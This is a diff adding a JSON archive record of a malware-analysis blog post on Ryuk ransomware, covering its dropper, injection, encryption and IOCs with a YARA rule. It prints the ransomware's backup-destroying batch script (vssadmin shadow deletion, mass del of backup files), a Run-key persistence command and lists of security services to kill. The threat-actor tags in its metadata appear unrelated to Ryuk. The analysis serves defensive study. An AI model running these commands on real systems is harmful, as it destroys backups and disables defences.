@@ -1,0 +1,183 @@
+{
+    "id": "39158874-9ebc-4362-95c7-81311e80314e",
+    "created_at": "2023-01-12T15:08:23.453763Z",
+    "updated_at": "2025-03-27T02:05:38.005387Z",
+    "deleted_at": null,
+    "sha1_hash": "73e2d3ea671dd3e9f477e988b3995e6a5c20dd2e",
+    "title": "2020-05-05 - Deep Analysis of Ryuk Ransomware",
+    "authors": "",
+    "file_creation_date": "2022-05-28T00:26:53Z",
+    "file_modification_date": "2022-05-28T00:26:53Z",
+    "file_size": 813110,
+    "plain_text": "# Deep Analysis of Ryuk Ransomware\n\n**n1ght-w0lf.github.io/malware analysis/ryuk-ransomware/**\n\n### Abdallah Elshinbary\n\nMalware Analysis & Reverse Engineering Adventures\n\n13 minute read\n\n## Introduction\n\n\nMay 5, 2020\n\n\n-----\n\n## Attack Chain\n\nRyuk has been know to be a part of a bigger `\"Triple Threat\" attack that involves`\n```\nEmotet and TrickBot .\n\n```\nThe first stage of this attack is the delivery of Emotet through phishing emails that contain a\nweaponized word document, this document contains a macro code that downloads Emotet.\n\nOnce Emotet executes, it downloads another malware (usually TrickBot) which can collect\nsystem information, steal credentials, disable AV, do lateral movement, …\n\nThe third stage of the attack is to connect to the `C&C server to download` `Ryuk which`\nmakes use of the lateral movement done by `TrickBot to infect and encrypt as many`\nsystems on the network as possible.\n\n## Ryuk overview\n\nI will give a brief overview of how Ryuk operates then I will go into details in the upcoming\nsections.\n\nRyuk operates in two stages. The first stage is a dropper that drops the real Ryuk\nransomware at another directory and exits. Then the ransomware tries to injects running\nprocesses to avoid detection. We can also see that it launches a `cmd.exe process to`\nmodify the registry.\n\n\n-----\n\nAfter that, Ryuk goes through encrypting the system files and network shares, it drops a\n```\n\"Ransom Note\" at every folder it encrypts under the name RyukReadMe.txt .\n\n```\nEnough introduction, let’s dive into Ryuk.\n\n## First Stage (The Dropper)\n\n```\nSHA256: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2\n\n```\n\nThe dropper first checks the windows `MajorVersion and if it’s equal to 5` `(windows 2000`\n```\n| windows XP | Windows Server 2003), it drops the ransomware executable at\nC:\\Documents and Settings\\Default User\\, otherwise it drops it at\n\n```\n\n-----\n\nThe name of the dropped executable is five randomly generated characters.\n\nIf the creation of this file failed, Ryuk drops the executable at the same directory of the\ndropper with replacing the last character of its name with the letter ‘V’ (If the dropper name is\n```\nryuk.exe, the dropped executable will be ryuV.exe ).\n\n```\nNext we can see a call to `IsWow64Process() and if it returns` `true (which means Ryuk is`\nrunning at a 64 bit system), it writes the 64 bit binary to the dropped executable, else it writes\nthe 32 bit binary. The 2 binary files are stored at the `.data section.`\n\nThe last step is a call to `ShellExecuteW() to execute the second stage executable with`\npassing it one argument which is the dropper path (This is used later to delete the dropper).\n\n\n-----\n\n## Second Stage\n\n```\nSHA256: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d\n\n```\n\n## Deleting The Dropper\n\nBefore the dropper exits, it passes its path to the second stage executable as a command\nline argument which in turn deletes the dropper.\n\n## Persistence\n\nRyuk uses the very well know registry key to achieve persistence, It creates a new value\nunder the name\n```\n\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchos\"\n\n```\nand its data is set to the executable path which in my case is\n```\n\"C:\\users\\Public\\BPWPc.exe\" .\n\n```\nHere is the full command:\n```\nC:\\Windows\\System32\\cmd.exe /C REG ADD\n\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t\nREG_SZ /d \"C:\\users\\Public\\BPWPc.exe\" /f\n\n```\n\n-----\n\n## Privilege Escalation\n\nRyuk uses `AdjustTokenPrivileges() function to adjust its process security access`\ntoken. The requested privilege name is `SeDebugPrivilege and according to Microsoft`\ndocs:\n\nSeDebugPrivilege:\n\nRequired to debug and adjust the memory of a process owned by another account.\nWith this privilege, the user can attach a debugger to any process or to the kernel.\n\nThis method is usually used by malware to perform process injection (which is done next).\n\n## Process Injection\n\nRyuk goes through all running processes and stores `(ProcessName, ProcessID,`\n```\nProcessType) in a big array, ProcessType is an integer that is set to 1 If the domain\n\n```\nname of the user of the process starts with “NT A” (which is “NT AUTHORITY”), otherwise\nthe `ProcessType is set to 2.`\n\n\n-----\n\nTo make it easier, I created a structure in IDA called `ProcessInfo .`\n\nAfter that, Ryuk loops through the processes’ stored data to perform the process injection.\n\nIf the process name is `(csrss.exe | explorer.exe | lsaas.exe), Ryuk ignores that`\nprocess.\n\n\n-----\n\nThe process injection technique used here is very simple, Ryuk allocates memory for its\nprocess at the target process memory space using `VirtualAllocEx(), then it writes its`\nprocess to that allocated memory using `WriteProcessMemory() . Finally it creates a new`\nthread using `CreateRemoteThread() to run Ryuk’s thread at the injected process.`\n\n\n-----\n\n## Building Imports\n\nRyuk imports its necessary functions dynamically using `LoadLibraryA() and`\n```\nGetProcAdress() . The names of the imported functions are obfuscated so static analysis\n\n```\nwon’t do very well here.\n\nWe can use a debugger to get these names rather than reversing the obfuscation algorithm.\n\n\n-----\n\nHere is the list of imported functions:\n\nExpand to see more\nadvapi32.dll\n\nCryptAcquireContextW\n\nCryptDecrypt\n\nCryptDeriveKey\n\nCryptDestroyKey\n\nCryptEncrypt\n\nCryptExportKey\n\nCryptGenKey\n\nCryptImportKey\n\nGetUserNameA\n\nGetUserNameW\n\nRegCloseKey\n\nRegDeleteValueW\n\nRegOpenKeyExA\n\nRegOpenKeyExW\n\nRegQueryValueExA\n\nRegSetValueExW\n\nkernel32.dll\n\nCloseHandle\n\nCopyFileA\n\n\n-----\n\nCopyFileW\nCreateDirectoryW\nCreateFileA\nCreateFileW\nCreateProcessA\nCreateProcessW\nDeleteFileW\nExitProcess\nFindClose\nFindFirstFileW\nFindNextFileW\nFreeLibrary\nGetCommandLineW\nGetCurrentProcess\nGetDriveTypeW\nGetFileAttributesA\nGetFileAttributesW\nGetFileSize\nGetLogicalDrives\nGetModuleFileNameA\nGetModuleFileNameW\nGetModuleHandleA\nGetStartupInfoW\nGetTickCount\nGetVersionExW\nGetWindowsDirectoryW\nGlobalAlloc\nLoadLibraryA\nReadFile\nSetFileAttributesA\nSetFileAttributesW\nSetFilePointer\nSleep\nVirtualAlloc\nVirtualFree\nWinExec\nWow64DisableWow64FsRedirection\nWow64RevertWow64FsRedirection\nWriteFile\nole32.dll\nCoCreateInstance\nCoInitialize\n\n\n-----\n\nShell32.dll\nShellExecuteA\nShellExecuteW\nmpr.dll\nWNetCloseEnum\nWNetEnumResourceW\nWNetOpenEnumW\nIphlpapi.dll\nGetIpNetTable\n\n## Killing Processes\n\nRyuk has a long list of predefined services and processes to kill using `net stop and`\n```\ntaskkill /IM respectively.\n\n```\nHere is the list of services:\n\nExpand to see more\nAcronis VSS Provider\n\nEnterprise Client Service\n\nSophos Agent\n\nSophos AutoUpdate Service\nSophos Clean Service\n\nSophos Device Control Service\n\nSophos File Scanner Service\n\nSophos Health Service\n\nSophos MCS Agent\n\nSophos MCS Client\n\nSophos Message Router\n\nSophos Safestore Service\n\nSophos System Protection Service\n\nSophos Web Control Service\n\nSQLsafe Backup Service\n\nSQLsafe Filter Service\n\nSymantec System Recovery\n\nVeeam Backup Catalog Data Service\n\nAcronisAgent\n\nAcrSch2Svc\n\nAntivirus\n\nARSM\n\nBackupExecAgentAccelerator\n\nBackupExecAgentBrowser\n\nBackupExecDeviceMediaService\n\n\n-----\n\nBackupExecJobEngine\nBackupExecManagementService\nBackupExecRPCService\nBackupExecVSSProvider\nbedbg\nDCAgent\nEPSecurityService\nEPUpdateService\nEraserSvc11710\nEsgShKernel\nFA_Scheduler\nIISAdmin\nIMAP4Svc\nmacmnsvc\nmasvc\nMBAMService\nMBEndpointAgent\nMcAfeeEngineService\nMcAfeeFramework\nMcAfeeFrameworkMcAfeeFramework\nMcShield\nMcTaskManager\nmfemms\nmfevtp\nMMS\nmozyprobackup\nMsDtsServer\nMsDtsServer100\nMsDtsServer110\nMSExchangeES\nMSExchangeIS\nMSExchangeMGMT\nMSExchangeMTA\nMSExchangeSA\nMSExchangeSRS\nMSOLAP$SQL_2008\nMSOLAP$SYSTEM_BGC\nMSOLAP$TPS\nMSOLAP$TPSAMA\nMSSQL$BKUPEXEC\nMSSQL$ECWDB2\nMSSQL$PRACTICEMGT\n\n\n-----\n\nMSSQL$PRACTTICEBGC\nMSSQL$PROFXENGAGEMENT\nMSSQL$SBSMONITORING\nMSSQL$SHAREPOINT\nMSSQL$SQL_2008\nMSSQL$SYSTEM_BGC\nMSSQL$TPS\nMSSQL$TPSAMA\nMSSQL$VEEAMSQL2008R2\nMSSQL$VEEAMSQL2012\nMSSQLFDLauncher\nMSSQLFDLauncher$PROFXENGAGEMENT\nMSSQLFDLauncher$SBSMONITORING\nMSSQLFDLauncher$SHAREPOINT\nMSSQLFDLauncher$SQL_2008\nMSSQLFDLauncher$SYSTEM_BGC\nMSSQLFDLauncher$TPS\nMSSQLFDLauncher$TPSAMA\nMSSQLSERVER\nMSSQLServerADHelper100\nMSSQLServerOLAPService\nMySQL80\nMySQL57\nntrtscan\nOracleClientCache80\nPDVFSService\nPOP3Svc\nReportServer\nReportServer$SQL_2008\nReportServer$SYSTEM_BGC\nReportServer$TPS\nReportServer$TPSAMA\nRESvc\nsacsvr\nSamSs\nSAVAdminService\nSAVService\nSDRSVC\nSepMasterService\nShMonitor\nSmcinst\nSmcService\n\n\n-----\n\nSMTPSvc\nSNAC\nSntpService\nsophossps\nSQLAgent$BKUPEXEC\nSQLAgent$ECWDB2\nSQLAgent$PRACTTICEBGC\nSQLAgent$PRACTTICEMGT\nSQLAgent$PROFXENGAGEMENT\nSQLAgent$SBSMONITORING\nSQLAgent$SHAREPOINT\nSQLAgent$SQL_2008\nSQLAgent$SYSTEM_BGC\nSQLAgent$TPS\nSQLAgent$TPSAMA\nSQLAgent$VEEAMSQL2008R2\nSQLAgent$VEEAMSQL2012\nSQLBrowser\nSQLSafeOLRService\nSQLSERVERAGENT\nSQLTELEMETRY\nSQLTELEMETRY$ECWDB2\nSQLWriter\nSstpSvc\nsvcGenericHost\nswi_filter\nswi_service\nswi_update_64\nTmCCSF\ntmlisten\nTrueKey\nTrueKeyScheduler\nTrueKeyServiceHelper\nUI0Detect\nVeeamBackupSvc\nVeeamBrokerSvc\nVeeamCatalogSvc\nVeeamCloudSvc\nVeeamDeploymentService\nVeeamDeploySvc\nVeeamEnterpriseManagerSvc\nVeeamMountSvc\n\n\n-----\n\nVeeamNFSSvc\nVeeamRESTSvc\nVeeamTransportSvc\nW3Svc\nwbengine\nWRSVC\nMSSQL$VEEAMSQL2008R2\nSQLAgent$VEEAMSQL2008R2\nVeeamHvIntegrationSvc\nswi_update\nSQLAgent$CXDB\nSQLAgent$CITRIX_METAFRAME\nSQL Backups\nMSSQL$PROD\nZoolz 2 Service\nMSSQLServerADHelper\nSQLAgent$PROD\nmsftesql$PROD\nNetMsmqActivator\nEhttpSrv\nekrn\nESHASRV\nMSSQL$SOPHOS\nSQLAgent$SOPHOS\nAVP\nklnagent\nMSSQL$SQLEXPRESS\nSQLAgent$SQLEXPRESS\nwbengine\nkavfsslp\nKAVFSGT\nKAVFS\nmfefire\n\nAnd here is the list of processes:\n\nExpand to see more\nzoolz.exe\nagntsvc.exe\ndbeng50.exe\ndbsnmp.exe\nencsvc.exe\n\nexcel.exe\n\n\n-----\n\nfirefoxconfig.exe\ninfopath.exe\nisqlplussvc.exe\nmsaccess.exe\nmsftesql.exe\nmspub.exe\nmydesktopqos.exe\nmydesktopservice.exe\nmysqld.exe\nmysqld-nt.exe\nmysqld-opt.exe\nocautoupds.exe\nocomm.exe\nocssd.exe\nonenote.exe\noracle.exe\noutlook.exe\npowerpnt.exe\nsqbcoreservice.exe\nsqlagent.exe\nsqlbrowser.exe\nsqlservr.exe\nsqlwriter.exe\nsteam.exe\nsynctime.exe\ntbirdconfig.exe\nthebat.exe\nthebat64.exe\nthunderbird.exe\nvisio.exe\nwinword.exe\nwordpad.exe\nxfssvccon.exe\ntmlisten.exe\nPccNTMon.exe\nCNTAoSMgr.exe\nNtrtscan.exe\nmbamtray.exe\n\n## Deleting Backups\n\nRyuk drops a batch script at `C:\\Users\\Public\\window.bat which deletes all shadow`\ncopies and possible backups then the script deletes itself\n\n\n-----\n\n```\nvssadmin Delete Shadows /all /quiet\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\nvssadmin Delete Shadows /all /quiet\ndel /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.*\nc:\\*.set c:\\*.win c:\\*.dsk\ndel /s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.*\nd:\\*.set d:\\*.win d:\\*.dsk\ndel /s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.*\ne:\\*.set e:\\*.win e:\\*.dsk\ndel /s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.*\nf:\\*.set f:\\*.win f:\\*.dsk\ndel /s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.*\ng:\\*.set g:\\*.win g:\\*.dsk\ndel /s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.*\nh:\\*.set h:\\*.win h:\\*.dsk\ndel %0\n\n## The Encryption Process\n\n```\nRyuk uses a multi threading approach for the encryption process, it creates a new thread for\neach file it encrypts which makes it very fast.\n\nIt starts enumerating files using `FindFirstFileW() and` `FindNextFileW() then it passes`\neach file name to a new encryption thread. Note that Ryuk avoids encrypting these file\nextensions:\n```\n.dll\n.lnk\n.hrmlog\n.ini\n.exe\n\n```\nEach encryption thread starts by generating a random 256 AES encryption key using\n```\nCryptGenKey(), Ryuk utilizes the WindowsCrypto API for the encryption.\n\n```\n\n-----\n\nThen it goes into the typical encryption loop, the files are encrypted in chunks with a chunk\nsize of `1000000 bytes .`\n\nFinally Ryuk write a metadata block of size `274 bytes at the end of the file. The first` `6`\n```\nbytes are the keyword HERMES .\n\n```\nAfter that, The AES key is encrypted with an RSA public key before it’s written to the end of\nthe file and then exported using `CryptExportKey(), This function generates` `12 bytes`\n```\nof Blob information + 256 bytes (the encrypted key) .\n\n```\n\n-----\n\nThe RSA public key is embedded in the executable, it’s imported using `CryptImportKey()`\nand passed to every encryption thread.\n\nWe can see at the end of the encryption routine a check if the keyword `HERMES is present`\nat the end of the file (which indicates the file is encrypted).\n\nThis check is actually done before encrypting the file to avoid encrypting it twice.\n\nHere is an example of the complete metadata block:\n\n\n-----\n\n## Encrypting Network Shares\n\nRyuk enumerates network shares using `WNetOpenEnumW() and` `WNetEnumResourceA()`\nrespectively.\n\n\n-----\n\nFor each network resource found, the resource’s name will be appended to a list separated\nby a semicolon. This list will be used later to encrypt these network shares with the same\nencryption process above.\n\n## IOCs\n\n**Hashes**\n\nRyuk: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7\n\nDropper: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2\n\n**Files**\n\nC:\\Users\\Public\\window.bat\n\n**Registry**\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n**Emails**\n\nWayneEvenson@protonmail[.]com\n\nWayneEvenson@tutanota[.]com\n\n## Yara Rule\n\n\n-----\n\n```\nrule Ryuk\n{\n  meta:\n    author = \"N1ght-W0lf\"\n    description = \"Detect Ryuk Samples\"\n    date = \"2020-05-08\"\n  strings:\n    $s1 = \"RyukReadMe.txt\" ascii wide\n    $s2 = \"No system is safe\" ascii wide\n    $s3 = \"svchos\" ascii wide fullword\n    $s4 = \"vssadmin Delete Shadows /all /quiet\" ascii wide\n    $s5 = \"UNIQUE_ID_DO_NOT_REMOVE\" ascii wide\n    $s7 = \"\\\\users\\\\Public\\\\window.bat\" ascii wide\n    $s6 = \"HERMES\" ascii wide\n  condition:\n    5 of them\n}\n\n## External References\n\n```\nhttps://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-ofryuk-ransomware/\n\n[https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/](https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/)\n\n[https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/](https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/)\n\n[https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672)\n\nhttps://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-usingCryptoAPI\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-05 - Deep Analysis of Ryuk Ransomware.pdf"
+    ],
+    "report_names": [
+        "2020-05-05 - Deep Analysis of Ryuk Ransomware.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
+            "created_at": "2023-01-06T13:46:38.626906Z",
+            "updated_at": "2025-03-27T02:00:02.877001Z",
+            "deleted_at": null,
+            "main_name": "Tick",
+            "aliases": [
+                "Stalker Taurus",
+                "PLA Unit 61419",
+                "Nian",
+                "BRONZE BUTLER",
+                "REDBALDKNIGHT",
+                "STALKER PANDA",
+                "G0060"
+            ],
+            "source_name": "MISPGALAXY:Tick",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
+            "created_at": "2022-10-25T16:07:23.419513Z",
+            "updated_at": "2025-03-27T02:02:09.790389Z",
+            "deleted_at": null,
+            "main_name": "Bronze Butler",
+            "aliases": [
+                "Bronze Butler",
+                "CTG-2006",
+                "Operation ENDTRADE",
+                "RedBaldNight",
+                "Stalker Panda",
+                "Stalker Taurus",
+                "TEMP.Tick",
+                "Tick"
+            ],
+            "source_name": "ETDA:Bronze Butler",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "9002 RAT",
+                "AngryRebel",
+                "Blogspot",
+                "Daserf",
+                "Datper",
+                "Elirks",
+                "Farfli",
+                "Gh0st RAT",
+                "Ghost RAT",
+                "HOMEUNIX",
+                "HidraQ",
+                "HomamDownloader",
+                "Homux",
+                "Hydraq",
+                "Lilith",
+                "Lilith RAT",
+                "McRAT",
+                "MdmBot",
+                "Mimikatz",
+                "Minzen",
+                "Moudour",
+                "Muirim",
+                "Mydoor",
+                "Nioupale",
+                "PCRat",
+                "POISONPLUG.SHADOW",
+                "Roarur",
+                "RoyalRoad",
+                "ShadowPad Winnti",
+                "ShadowWali",
+                "ShadowWalker",
+                "SymonLoader",
+                "WCE",
+                "Wali",
+                "Windows Credential Editor",
+                "Windows Credentials Editor",
+                "XShellGhost",
+                "XXMM",
+                "gsecdump",
+                "rarstar"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
+            "created_at": "2022-10-25T16:47:55.541639Z",
+            "updated_at": "2025-03-27T02:05:17.253496Z",
+            "deleted_at": null,
+            "main_name": "BRONZE BUTLER",
+            "aliases": [
+                "Daserf",
+                "Stalker Panda ",
+                "Tick ",
+                "CTG-2006 "
+            ],
+            "source_name": "Secureworks:BRONZE BUTLER",
+            "tools": [
+                " DGet",
+                " Daserf",
+                " Datper",
+                " Gofarer",
+                " MSGet",
+                " Mimikatz",
+                " RarStar",
+                " Screen Capture Tool",
+                " ShadowPad",
+                " T-SMB",
+                " WinRAR",
+                " Windows Credential Editor",
+                " gsecdump",
+                " xmm downloader",
+                " xxmm",
+                "ABK"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536103,
+    "ts_updated_at": 1743041138,
+    "ts_creation_date": 1653697613,
+    "ts_modification_date": 1653697613,
+    "files": {
+        "pdf": "https://archive.orkl.eu/73e2d3ea671dd3e9f477e988b3995e6a5c20dd2e.pdf",
+        "text": "https://archive.orkl.eu/73e2d3ea671dd3e9f477e988b3995e6a5c20dd2e.txt",
+        "img": "https://archive.orkl.eu/73e2d3ea671dd3e9f477e988b3995e6a5c20dd2e.jpg"
+    }
+}
